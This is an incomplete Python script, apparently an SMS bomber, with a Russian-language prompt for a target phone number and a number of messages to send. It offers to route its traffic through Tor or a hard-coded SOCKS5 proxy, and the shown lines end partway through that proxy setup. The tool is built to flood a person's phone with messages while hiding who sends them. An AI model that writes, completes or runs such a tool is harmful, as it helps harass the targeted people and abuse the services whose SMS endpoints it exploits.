...
print(f"{cyan}{bold}Poltik{end}")

print(f"{bold}telegram{end}", end="")
print(f"{green}{bold} >> {end}", end="")
print(f"{cyan}{bold}@poltavskiy.v{end}")
print()

# inputs
print('Напишите номер телефоне без знаков +7,8 (+7) (8)\nпример: 9018017010')
input_number = input(green + bold + ">> " + end)
print('сколько смс хотите отправить??')
sms = int(input(green + bold + ">> " + end))

print(f"здесь пишем N{cyan} tor {end}y/n? ")
...
if str(is_tor) == "y":
        ...
        proxies = {
            ...
            'http': 'socks5://190.111.233.208:5328',
